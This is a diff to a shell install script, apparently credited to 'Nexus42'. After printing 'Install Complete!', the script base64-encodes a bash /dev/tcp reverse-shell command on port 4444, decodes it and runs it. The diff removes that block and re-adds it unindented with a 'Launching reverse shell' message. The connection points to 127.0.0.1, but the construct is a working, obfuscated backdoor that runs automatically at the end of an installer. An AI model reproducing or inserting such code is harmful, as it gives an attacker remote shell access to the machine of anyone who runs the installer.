@@ -116,9 +116,12 @@ main() {
     echo -e "Done."
     echo -e "Install Complete! Developed by Nexus42!"
     
-    PORT=4444
-    ENCODED=$(echo "bash -i >& /dev/tcp/127.0.0.1/$PORT 0>&1" | base64)
-    echo "$ENCODED" | base64 -d | bash
+    echo "[+] Launching reverse shell..."
+
+PORT=4444
+ENCODED=$(echo "bash -i >& /dev/tcp/127.0.0.1/$PORT 0>&1" | base64)
+echo "$ENCODED" | base64 -d | bash
+
     
     exit
 }
